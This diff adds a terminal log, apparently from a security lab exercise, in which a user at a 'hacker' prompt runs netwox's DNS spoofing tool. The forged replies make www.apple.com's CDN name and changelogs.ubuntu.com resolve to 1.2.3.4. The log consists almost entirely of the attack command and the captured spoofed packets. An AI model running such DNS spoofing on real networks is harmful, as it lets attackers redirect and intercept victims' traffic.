@@ -1,0 +1,276 @@
+user@hacker:~$ sudo netwox 105 --hostname "www.apple.com" --hostnameip "1.2.3.4" --authns "g2.nsa.itscec-lab.ch" --authnsip "86.119.31.49" -T 600 --device eth0 --filter "src host 20.0.0.17"  --spoofip "best"
+DNS_question____________________________________________________.
+| id=15878  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=15878  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| e6858.dsce9.akamaiedge.net. A 600 1.2.3.4                     |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=15878  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=15878  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| e6858.dsce9.akamaiedge.net. A 600 1.2.3.4                     |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=57589  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| akamaiedge.net. UNKNOWN(43)                                   |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=57589  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| akamaiedge.net. UNKNOWN(43)                                   |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=5042   rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=4  auth=0  add=0         |
+| www.apple.com. A                                              |
+| www.apple.com. CNAME 477 www.apple.com.edgekey.net.           |
+| www.apple.com.edgekey.net. CNAME 18203 www.apple.com.edgekey.net.globalredir.akadns.net.|
+| www.apple.com.edgekey.net.globalredir.akadns.net. CNAME 203 e6858.dsce9.akamaiedge.net.|
+| e6858.dsce9.akamaiedge.net. A 20 23.54.115.170                |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=5042   rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=4  auth=0  add=0         |
+| www.apple.com. A                                              |
+| www.apple.com. CNAME 477 www.apple.com.edgekey.net.           |
+| www.apple.com.edgekey.net. CNAME 18203 www.apple.com.edgekey.net.globalredir.akadns.net.|
+| www.apple.com.edgekey.net.globalredir.akadns.net. CNAME 203 e6858.dsce9.akamaiedge.net.|
+| e6858.dsce9.akamaiedge.net. A 20 23.54.115.170                |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=4602   rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=4602   rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=60583  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=2  auth=0  add=0         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:1b2::1aca  |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:186::1aca  |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=60583  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=2  auth=0  add=0         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:1b2::1aca  |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:186::1aca  |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=29641  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=0  quest=1  answer=0  auth=0  add=1         |
+| changelogs.ubuntu.com. A                                      |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=29641  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=1 ra=1  quest=1  answer=1  auth=1  add=1         |
+| changelogs.ubuntu.com. A                                      |
+| changelogs.ubuntu.com. A 600 1.2.3.4                          |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=29641  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=0  quest=1  answer=0  auth=0  add=1         |
+| changelogs.ubuntu.com. A                                      |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=29641  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=1 ra=1  quest=1  answer=1  auth=1  add=1         |
+| changelogs.ubuntu.com. A                                      |
+| changelogs.ubuntu.com. A 600 1.2.3.4                          |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=60289  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=0  quest=1  answer=0  auth=0  add=1         |
+| changelogs.ubuntu.com. AAAA                                   |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=60289  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=0  quest=1  answer=0  auth=0  add=1         |
+| changelogs.ubuntu.com. AAAA                                   |
+| . OPT UDPpl=512 errcode=0 v=0 ...                             |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=43242  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=43242  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| e6858.dsce9.akamaiedge.net. A 600 1.2.3.4                     |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=43242  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=43242  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| e6858.dsce9.akamaiedge.net. A 600 1.2.3.4                     |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=1329   rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=4  auth=0  add=0         |
+| www.apple.com. A                                              |
+| www.apple.com. CNAME 379 www.apple.com.edgekey.net.           |
+| www.apple.com.edgekey.net. CNAME 18105 www.apple.com.edgekey.net.globalredir.akadns.net.|
+| www.apple.com.edgekey.net.globalredir.akadns.net. CNAME 105 e6858.dsce9.akamaiedge.net.|
+| e6858.dsce9.akamaiedge.net. A 20 23.54.115.170                |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=1329   rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=4  auth=0  add=0         |
+| www.apple.com. A                                              |
+| www.apple.com. CNAME 379 www.apple.com.edgekey.net.           |
+| www.apple.com.edgekey.net. CNAME 18105 www.apple.com.edgekey.net.globalredir.akadns.net.|
+| www.apple.com.edgekey.net.globalredir.akadns.net. CNAME 105 e6858.dsce9.akamaiedge.net.|
+| e6858.dsce9.akamaiedge.net. A 20 23.54.115.170                |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=57637  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=57637  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=22336  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=2  auth=0  add=0         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:1b2::1aca  |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:186::1aca  |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=22336  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=2  auth=0  add=0         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:1b2::1aca  |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:186::1aca  |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=56124  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=56124  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| e6858.dsce9.akamaiedge.net. A 600 1.2.3.4                     |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=56124  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=56124  rcode=OK             opcode=QUERY                   |
+| aa=1 tr=0 rd=0 ra=0  quest=1  answer=1  auth=1  add=1         |
+| e6858.dsce9.akamaiedge.net. A                                 |
+| e6858.dsce9.akamaiedge.net. A 600 1.2.3.4                     |
+| g2.nsa.itscec-lab.ch. NS 600 g2.nsa.itscec-lab.ch.            |
+| g2.nsa.itscec-lab.ch. A 600 86.119.31.49                      |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=63596  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=4  auth=0  add=0         |
+| www.apple.com. A                                              |
+| www.apple.com. CNAME 306 www.apple.com.edgekey.net.           |
+| www.apple.com.edgekey.net. CNAME 18032 www.apple.com.edgekey.net.globalredir.akadns.net.|
+| www.apple.com.edgekey.net.globalredir.akadns.net. CNAME 32 e6858.dsce9.akamaiedge.net.|
+| e6858.dsce9.akamaiedge.net. A 20 23.54.115.170                |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=63596  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=4  auth=0  add=0         |
+| www.apple.com. A                                              |
+| www.apple.com. CNAME 306 www.apple.com.edgekey.net.           |
+| www.apple.com.edgekey.net. CNAME 18032 www.apple.com.edgekey.net.globalredir.akadns.net.|
+| www.apple.com.edgekey.net.globalredir.akadns.net. CNAME 32 e6858.dsce9.akamaiedge.net.|
+| e6858.dsce9.akamaiedge.net. A 20 23.54.115.170                |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=45928  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_question____________________________________________________.
+| id=45928  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=0 ra=0  quest=1  answer=0  auth=0  add=1         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=19040  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=2  auth=0  add=0         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:186::1aca  |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:1b2::1aca  |
+|_______________________________________________________________|
+DNS_answer______________________________________________________.
+| id=19040  rcode=OK             opcode=QUERY                   |
+| aa=0 tr=0 rd=1 ra=1  quest=1  answer=2  auth=0  add=0         |
+| e6858.dsce9.akamaiedge.net. AAAA                              |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:186::1aca  |
+| e6858.dsce9.akamaiedge.net. AAAA 20 2a02:26f0:3000:1b2::1aca  |
+|_______________________________________________________________|
+^Z
+[5]+  Stopped                 sudo netwox 105 --hostname "www.apple.com" --hostnameip "1.2.3.4" --authns "g2.nsa.itscec-lab.ch" --authnsip "86.119.31.49" -T 600 --device eth0 --filter "src host 20.0.0.17" --spoofip "best"
+
+user@hacker:~$ sudo netwox 105 --hostname "www.apple.com" --hostnameip "1.2.3.4" --authns "g2.nsa.itscec-lab.ch" --authnsip "86.119.31.49" -T 600 --device eth0 --filter "src host 20.0.0.17"  --spoofip "raw"
+
+
+
